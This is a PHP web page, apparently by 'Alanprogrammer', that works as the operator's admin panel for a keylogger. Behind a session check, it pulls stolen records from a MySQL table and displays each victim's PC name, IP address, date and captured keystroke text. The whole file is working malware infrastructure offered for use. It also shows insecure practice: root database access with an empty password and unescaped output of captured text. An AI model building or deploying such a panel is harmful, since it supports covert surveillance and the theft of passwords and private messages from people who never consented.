<html>
<head>
  <!-- Latest compiled and minified CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

  <!-- Optional theme -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">

  <!-- Latest compiled and minified JavaScript -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>


<title>Administracion Keylogger</title>
</head>
<body>
<?php
echo "<nav class='navbar navbar-inverse'>";
echo "<div class'navbar' >";
echo "<a class='navbar-brand' href='#'>KEYLOGGER PANEL</a>";
echo "</div>";
echo "</nav>";


//Autor:Alanprogrammer
session_start();
if (isset($_SESSION['username'])){
  $host = "localhost";
  $user = "root";
  $pw = "";
  $db = "keylogger_Web";
  //Conexion
  $con = mysql_connect($host,$user,$pw);
  mysql_select_db($db,$con);
  $query = mysql_query("SELECT * FROM datos_recibido");
  echo "<table class='table'>";
  echo "<tr>";
  echo "<td>Nombre de la pc</td>";
  echo "<td>ip</td>";
  echo "<td>fecha</td>";
  echo "<td>texto obtenido</td>";
  echo "</tr>";
  for ($i=0;$i < mysql_num_rows($query);$i++){
    $line = mysql_fetch_row($query);
    echo "<tr>";
    echo "<td>".$line[3]."</td>";
    echo "<td>".$line[1]."</td>";
    echo "<td>".$line[2]."</td>";
    echo "<td>".$line[4]."</td>";
    echo "</tr>";


  }

  echo "</table>";
}else{
  header("location:https://41.media.tumblr.com/tumblr_lx7agiexnM1r8a8t8o1_540.jpg");
}


 ?>
</body>
 </html>
